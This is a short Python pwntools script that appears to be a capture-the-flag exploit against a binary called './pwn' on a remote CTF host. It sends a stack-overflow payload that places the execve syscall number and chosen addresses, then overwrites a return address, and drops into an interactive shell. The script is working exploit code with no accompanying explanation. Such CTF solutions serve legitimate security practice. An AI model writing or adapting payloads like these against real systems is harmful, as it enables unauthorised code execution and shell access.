from pwn import *

r=process("./pwn")
r=remote("node1.tgctf.woooo.tech",31927)
#gdb.attach(r)
pause()
r.recvuntil(b"name?\n")
pay1=b"a"*0x40+p64(59)+p64(0x404108)+p64(0)+p64(0)
r.send(pay1)

r.recvuntil(b"to say?\n")
pay2=b'a'*0x48+p64(0x404060)
r.send(pay2)

r.interactive()

#0x40111D
#0x40115F
